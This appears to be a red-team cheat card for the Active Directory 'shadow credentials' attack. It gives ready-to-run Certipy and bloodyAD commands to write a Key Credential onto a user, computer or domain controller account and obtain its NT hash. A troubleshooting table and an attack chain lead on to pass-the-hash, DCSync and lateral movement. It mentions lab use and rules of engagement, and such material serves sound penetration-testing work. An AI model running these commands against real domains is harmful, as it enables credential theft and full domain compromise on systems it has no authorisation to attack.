# Shadow credentials (senior)

GenericWrite / GenericAll on a **user or computer** → write a Key Credential
(`msDS-KeyCredentialLink`) → PKINIT as them → NT hash. Cleaner than a password
reset. Lab / RoE.

## When / not

Use when: BloodHound / bloodyAD shows GenericWrite, GenericAll, or
WriteAccountRestrictions on an account, **and** a CA that does PKINIT exists
(or Certipy can still print the NT hash).
Do not use when: you only have ForceChangePassword (that is `changepasswd`).
Do not leave the Key Credential on a customer object — Certipy `shadow auto`
clears it; if you `add` by hand, `certipy shadow list/clear`.

## Flags

```
certipy shadow auto -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' \
  -account TARGET -dc-ip {{DC}}
# computer:
certipy shadow auto -u {{USER}}@{{DOMAIN}} -p '{{PASS}}' \
  -account 'DC$' -dc-ip {{DC}}

# hash only (no TGT) if PKINIT is off:
# Certipy still prints NT hash from the U2U dance on many labs
```

`bloodyAD` twin:

```
bloodyAD --host {{DC}} -d {{DOMAIN}} -u {{USER}} -p '{{PASS}}' add shadowCredentials TARGET
```

## Read this

- Success line is an **NT hash** + a `.ccache` / `.pfx`. PTH that hash or `export KRB5CCNAME`.
- Target a **DA / CA / unconstrained host** first, not a helpdesk user.
- `KDC_ERR_PADATA_TYPE_NOSUPP` → PKINIT off. Keep the NT hash Certipy printed.

## Fail → next

| Symptom | Next |
| --- | --- |
| insufficient access | you have WriteProperty on a *different* attribute. Re-read the ACE |
| no CA / PKINIT | still try — hash may print. Else targetedKerberoast |
| computer target fails | MAQ + RBCD (`tickets.md` / `impacket.md` getST) |
| leftover credential | `certipy shadow clear -account TARGET` |

## Chain

BH GenericWrite on user → this card → NT hash → DCSync or lateral.
BH GenericWrite on computer → prefer RBCD (`getST`) unless you need the machine hash.
